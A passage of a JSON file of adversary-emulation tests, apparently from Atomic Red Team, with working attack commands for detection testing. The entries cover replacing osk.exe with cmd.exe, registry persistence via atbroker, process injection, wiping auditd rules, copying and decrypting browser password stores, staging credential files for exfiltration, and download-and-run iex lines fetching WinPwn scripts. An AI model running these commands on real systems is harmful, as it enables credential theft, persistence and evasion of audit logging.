		"name": "Create Symbolic Link From osk.exe to cmd.exe",
		"auto_generated_guid": "51ef369c-5e87-4f33-88cd-6d61be63edf2",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n",
			"cleanup_command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.008",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Atbroker.exe (AT) Executes Arbitrary Command via Registry Key",
		"auto_generated_guid": "444ff124-4c83-4e28-8df6-6efd3ece6bd4",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe\natbroker /start malware_test\n",
			"cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1546.008",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Process Injection via C#",
		"auto_generated_guid": "611b39b7-e243-4c81-87a4-7145a90358b1",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"exe_binary": {
				"description": "Output Binary",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "#{exe_binary} must be exist on system.\n",
				"prereq_command": "if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe\" -OutFile \"#{exe_binary}\"\n"
			}
		],
		"executor": {
			"command": "\"#{exe_binary}\"\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1055.004",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "EarlyBird APC Queue Injection in Go",
		"auto_generated_guid": "73785dd2-323b-4205-ab16-bb6f06677e14",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"spawn_process_path": {
				"description": "Path of the binary to spawn",
				"type": "string",
				"default": "C:\\Windows\\System32\\werfault.exe"
			},
			"spawn_process_name": {
				"description": "Name of the process to spawn",
				"type": "string",
				"default": "werfault"
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"#{spawn_process_path}\" -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"#{spawn_process_name}\" -ErrorAction SilentlyContinue\n"
		},
		"attack_technique": "T1055.004",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Remote Process Injection with Go using NtQueueApcThreadEx WinAPI",
		"auto_generated_guid": "4cc571b1-f450-414a-850f-879baf36aa06",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
		},
		"attack_technique": "T1055.004",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Delete all auditd rules using auditctl",
		"auto_generated_guid": "33a29ab1-cabb-407f-9448-269041bf2856",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if auditd is installed.\n",
				"prereq_command": "if [ $(command -v auditctl) ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "(yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)\n"
			}
		],
		"executor": {
			"command": "auditctl -D\n",
			"name": "sh",
			"elevation_required": true,
			"cleanup_command": "service auditd restart\n"
		},
		"attack_technique": "T1562.012",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Disable auditd using auditctl",
		"auto_generated_guid": "7906f0a6-b527-46ee-9026-6e81a9184e08",
		"supported_platforms": ["linux"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if auditd is installed.\n",
				"prereq_command": "if [ $(command -v auditctl) ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "(yum install auditd -y) || (apt-get install auditd -y) || (dnf install auditd -y)\n"
			}
		],
		"executor": {
			"command": "auditctl -e 0\n",
			"name": "sh",
			"elevation_required": true,
			"cleanup_command": "auditctl -e 1\n"
		},
		"attack_technique": "T1562.012",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Run Chrome-password Collector",
		"auto_generated_guid": "8c05b133-d438-47ca-a630-19cc464c4622",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_path": {
				"description": "File path for modified Sysinternals",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Modified Sysinternals must be located at #{file_path}\n",
				"prereq_command": "if (Test-Path \"#{file_path}\\SysInternals\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"#{file_path}\\Modified-SysInternalsSuite.zip\"\nExpand-Archive \"#{file_path}\\Modified-SysInternalsSuite.zip\" \"#{file_path}\\sysinternals\" -Force\nRemove-Item \"#{file_path}\\Modified-SysInternalsSuite.zip\" -Force\n"
			}
		],
		"executor": {
			"command": "Set-Location -path \"#{file_path}\\Sysinternals\";\n./accesschk.exe -accepteula .;\n",
			"cleanup_command": "Remove-Item \"#{file_path}\\Sysinternals\" -Force -Recurse -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Search macOS Safari Cookies",
		"auto_generated_guid": "c1402f7b-67ca-43a8-b5f3-3143abedc01b",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"search_string": {
				"description": "String to search Safari cookies to find.",
				"type": "string",
				"default": "coinbase"
			}
		},
		"executor": {
			"command": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "LaZagne - Credentials from Browser",
		"auto_generated_guid": "9a2915b3-3954-4cce-8c76-00fbf4dbd014",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"lazagne_path": {
				"description": "Path to LaZagne",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n",
				"prereq_command": "if (Test-Path \"#{lazagne_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{lazagne_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\" -OutFile \"#{lazagne_path}\"\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "\"#{lazagne_path}\" browsers\n"
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Simulating access to Chrome Login Data",
		"auto_generated_guid": "3d111226-d09a-4911-8715-fe11664f960d",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Chrome must be installed\n",
				"prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n",
			"cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data For Account\" -Force -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Simulating access to Opera Login Data",
		"auto_generated_guid": "28498c17-57e4-495a-b0be-cc1e36de408b",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Opera must be installed\n",
				"prereq_command": "if (((Test-Path \"$env:LOCALAPPDATA\\Programs\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Opera\\launcher.exe\"))) {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe\nStart-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'\nStart-Sleep -s 180\nStop-Process -Name \"opera\"\n"
			},
			{
				"description": "Opera login data file must exist\n",
				"prereq_command": "if (Test-Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\") {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -ItemType File\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n",
			"cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Simulating access to Windows Firefox Login Data",
		"auto_generated_guid": "eb8da98a-2e16-4551-b3dd-83de49baa14c",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Firefox must be installed\n",
				"prereq_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\"}else {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US\"}\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefoxsetup.exe\"\n(New-Object Net.WebClient).DownloadFile($url,$installer)\nStart-Process $installer -ArgumentList '/S' -Wait\n"
			},
			{
				"description": "Firefox login data file must exist\n",
				"prereq_command": "if (Test-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\") {exit 0} else {exit 1}",
				"get_prereq_command": "if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"}else {$firefox=\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\"}\nStart-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait\nStart-Process $firefox -NoNewWindow\nStart-Sleep -s 20\nStop-Process -Name firefox\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Force -Recurse\n",
			"cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Profiles\" -Force -ErrorAction Ignore -Recurse\n",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Simulating access to Windows Edge Login Data",
		"auto_generated_guid": "a6a5ec26-a2d1-4109-9d35-58b867689329",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Edge must be installed\n",
				"prereq_command": "if (Test-Path \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\") {exit 0} else {exit 1}",
				"get_prereq_command": "\"Installation is not implemented as Edge is a part of windows\"\n"
			},
			{
				"description": "Edge login data file must exist\n",
				"prereq_command": "if (Test-Path \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\") {exit 0} else {exit 1}",
				"get_prereq_command": "$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse\n",
			"cleanup_command": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -ErrorAction Ignore -Recurse\n",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Decrypt Mozilla Passwords with Firepwd.py",
		"auto_generated_guid": "dc9cd677-c70f-4df5-bd1c-f114af3c2381",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"Firepwd_Path": {
				"description": "Filepath for Firepwd.py",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1555.004\\Scripts\\Firepwd.py"
			},
			"Out_Filepath": {
				"description": "Filepath to output results to",
				"type": "string",
				"default": "$env:temp\\T1555.003Test8.txt"
			},
			"VS_CMD_Path": {
				"description": "Filepath to Visual Studio Build Tools Command prompt",
				"type": "string",
				"default": "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat"
			},
			"Python_Path": {
				"description": "Filepath to python",
				"type": "string",
				"default": "C:\\Program Files\\Python310\\python.exe"
			},
			"venv_path": {
				"description": "Path to the folder for the tactics venv",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1555.004"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Firefox profile directory must be present\n",
				"prereq_command": "if (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\"\nmsiexec.exe /i \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\" /quiet\nsleep -s 30\nstart-process \"$env:programfiles\\Mozilla Firefox\\firefox.exe\".\nsleep -s 5\nstop-process -name \"firefox\"\n"
			},
			{
				"description": "Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n",
				"prereq_command": "if (Test-Path \"#{VS_CMD_Path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://aka.ms/vs/17/release/vs_BuildTools.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe\"\nwrite-host \"Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe.\"\n"
			},
			{
				"description": "Python must be installed\n",
				"prereq_command": "if (Test-Path \"#{Python_Path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
			},
			{
				"description": "Computer must have venv configured at #{venv_path}\n",
				"prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "py -m venv \"#{venv_path}\"\n"
			},
			{
				"description": "Firepwd must exist at #{Firepwd_Path}\n",
				"prereq_command": "if (Test-Path \"#{Firepwd_Path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py\" -outfile \"#{Firepwd_Path}\"\n"
			},
			{
				"description": "Pycryptodome library must be installed \n",
				"prereq_command": "if (#{venv_path}\\Scripts\\pip.exe show pycryptodome) {exit 0} else {exit 1}\n",
				"get_prereq_command": "if (test-path \"#{VS_CMD_Path}\"){#{venv_path}\\Scripts\\pip.exe install pycryptodome | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq\"}\n"
			},
			{
				"description": "Pyasn1 library must be installed \n",
				"prereq_command": "if (#{venv_path}\\Scripts\\pip.exe show pyasn1) {exit 0} else {exit 1}\n",
				"get_prereq_command": "if (test-path \"#{VS_CMD_Path}\") & {#{venv_path}\\Scripts\\pip.exe install pyasn1 | out-null | cmd /c %comspec% /k \"#{VS_CMD_Path}\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.\"}\n"
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c #{venv_path}\\Scripts\\python.exe #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}\ncat #{Out_Filepath}\n",
			"cleanup_command": "Remove-Item -Path \"#{Out_Filepath}\" -erroraction silentlycontinue   \n",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "LaZagne.py - Dump Credentials from Firefox Browser",
		"auto_generated_guid": "87e88698-621b-4c45-8a89-4eaebdeaabb1",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"lazagne_path": {
				"description": "Path you put LaZagne Github with LaZagne.py",
				"type": "string",
				"default": "/tmp/LaZagne/Linux"
			},
			"specific_module": {
				"description": "You may change the module to \"all\" for all password that can be found by LaZagne.py",
				"type": "string",
				"default": "browsers -firefox"
			},
			"output_file": {
				"description": "This is where output for the Firefox passwords goes",
				"type": "string",
				"default": "/tmp/firefox_password.txt"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Get Lazagne from Github and install requirements",
				"prereq_command": "test -f #{lazagne_path}/laZagne.py",
				"get_prereq_command": "cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt"
			},
			{
				"description": "Needs git, python3 and some pip stuff",
				"prereq_command": "which git && which python3 && which pip",
				"get_prereq_command": "apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto"
			}
		],
		"executor": {
			"command": "python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}",
			"cleanup_command": "rm -R /tmp/LaZagne; rm -f #{output_file}",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Stage Popular Credential Files for Exfiltration",
		"auto_generated_guid": "f543635c-1705-42c3-b180-efd6dc6e7ee7",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"command": "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n",
			"cleanup_command": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue\n",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - BrowserPwn",
		"auto_generated_guid": "764ea176-fb71-494c-90ea-72e9d85dce76",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive",
			"cleanup_command": "rm .\\System.Data.SQLite.dll -ErrorAction Ignore",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - Loot local Credentials - mimi-kittenz",
		"auto_generated_guid": "ec1d0b37-f659-4186-869f-31a554891611",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials",
		"auto_generated_guid": "e5e3d639-6ea8-4408-9ecd-d5a286268ca0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Simulating Access to Chrome Login Data - MacOS",
		"auto_generated_guid": "124e13e5-d8a1-4378-a6ee-a53cd0c7e369",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n",
			"cleanup_command": "rm \"/tmp/T1555.003_Login Data\" >/dev/null 2>&1\nrm \"/tmp/T1555.003_Login Data For Account\" >/dev/null 2>&1\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "WebBrowserPassView - Credentials from Browser",
		"auto_generated_guid": "e359627f-2d90-4320-ba5e-b0f878155bbe",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"webbrowserpassview_path": {
				"description": "Path to the WebBrowserPassView executable ",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}\n",
				"prereq_command": "if (Test-Path \"#{webbrowserpassview_path}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile \"#{webbrowserpassview_path}\"\n"
			}
		],
		"executor": {
			"command": "Start-Process \"#{webbrowserpassview_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1555.003",
		"phases": ["credential-access"]
	},
	{
		"name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)",
		"auto_generated_guid": "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Firefox must be on the device.\n",
				"prereq_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\FirefoxStubInstaller.exe\"\nInvoke-WebRequest -OutFile $installer \"https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US\"\nStart-Process -FilePath $installer -Wait\nStop-Process -Name \"firefox\"\n"
			},
			{
				"description": "BrowserCollector must exist in the bin directory\n",
